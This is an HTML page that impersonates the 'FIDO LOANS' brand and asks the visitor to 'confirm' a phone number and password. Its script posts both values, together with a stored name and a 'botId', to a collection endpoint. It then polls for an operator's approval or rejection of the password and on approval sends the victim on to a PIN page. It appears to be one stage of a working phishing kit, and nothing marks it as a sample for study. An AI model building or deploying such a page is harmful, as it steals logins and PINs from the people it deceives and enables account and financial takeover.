<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verify Details</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #ffffff;
    }

    .brand-bar {
      width: 100%;
      height: 72px;
      display: flex;
      align-items: stretch;
      border-bottom: 1px solid #eee;
    }

    .brand-bar img {
      height: 100%;
      width: auto;
    }

    .brand-text-wrap {
      flex: 1;
      background: #e91e63;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .brand-text {
      color: #ffffff;
      font-size: 26px;
      font-weight: bold;
      letter-spacing: 1.5px;
    }

    .container {
      max-width: 420px;
      margin: auto;
      padding: 24px;
    }

    h1 {
      font-size: 22px;
      color: #0a8f55;
      margin-bottom: 8px;
    }

    p {
      font-size: 14px;
      color: #666;
      margin-bottom: 20px;
    }

    label {
      font-size: 14px;
      color: #444;
      display: block;
      margin-bottom: 6px;
    }

    input {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      margin-bottom: 20px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      padding: 16px;
      font-size: 16px;
      background: #0a8f55;
      color: #fff;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    .status {
      margin-top: 20px;
      text-align: center;
      font-size: 14px;
      color: #0a8f55;
      display: none;
    }

    .error {
      color: #d32f2f;
    }
  </style>
</head>
<body>

  <!-- HEADER -->
  <div class="brand-bar">
    <img src="fido-logo.jpeg" alt="Fido Logo">
    <div class="brand-text-wrap">
      <div class="brand-text">FIDO LOANS</div>
    </div>
  </div>

  <!-- CONTENT -->
  <div class="container">
    <h1>Confirm Your Details</h1>
    <p>Please enter your phone number and password to continue.</p>

    <form id="detailsForm">
      <label>Phone number</label>
      <input type="text" id="phone" required />

      <label>Password</label>
      <input type="password" id="password" required />

      <button type="submit">Continue</button>
    </form>

    <div id="status" class="status">⏳ Waiting for approval...</div>
  </div>

  <script>
    const form = document.getElementById('detailsForm');
    const statusEl = document.getElementById('status');

    const fullName = localStorage.getItem('fullName');
    const botId = 'bot1'; // change if needed

    if (!fullName) {
      alert('Session expired. Please start again.');
      window.location.href = 'index.html';
    }

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const phone = document.getElementById('phone').value;
      const password = document.getElementById('password').value;

      statusEl.style.display = 'block';
      statusEl.classList.remove('error');
      statusEl.textContent = '⏳ Waiting for approval...';

      const res = await fetch('/submit-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: fullName,
          phone,
          password,
          botId
        })
      });

      const { requestId } = await res.json();
      pollApproval(requestId);
    });

    function pollApproval(requestId) {
      const interval = setInterval(async () => {
        const res = await fetch(`/check-password/${requestId}`);
        const data = await res.json();

        if (data.approved === true) {
          clearInterval(interval);
          window.location.href = 'pin.html';
        }

        if (data.approved === false) {
          clearInterval(interval);
          statusEl.classList.add('error');
          statusEl.textContent = '❌ Incorrect password. Please try again.';
        }
      }, 2000);
    }
  </script>

</body>
</html>
